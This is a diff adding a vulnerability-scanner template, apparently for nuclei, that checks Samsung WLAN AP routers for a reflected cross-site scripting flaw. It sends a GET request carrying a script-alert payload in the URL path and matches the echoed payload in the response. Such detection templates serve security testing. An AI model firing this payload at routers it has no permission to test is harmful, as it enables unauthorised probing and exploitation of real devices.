@@ -1,0 +1,21 @@
+id: samsung-wlan-ap-xss
+info:
+  author: "Master\u5148\u751F"
+  name: "\u4E09\u661F\u8DEF\u7531\u5668WLAN AP\u53CD\u5C04\u578BXSS"
+  reference:
+  - https://www.freebuf.com/vuls/268435.html
+  severity: low
+  tags: Samsung WLAN AP,XSS
+requests:
+- matchers:
+  - status:
+    - 404
+    type: status
+  - part: body
+    type: word
+    words:
+    - <script>alert("{{randstr}}")</script>
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/<script>alert("{{randstr}}")</script>'
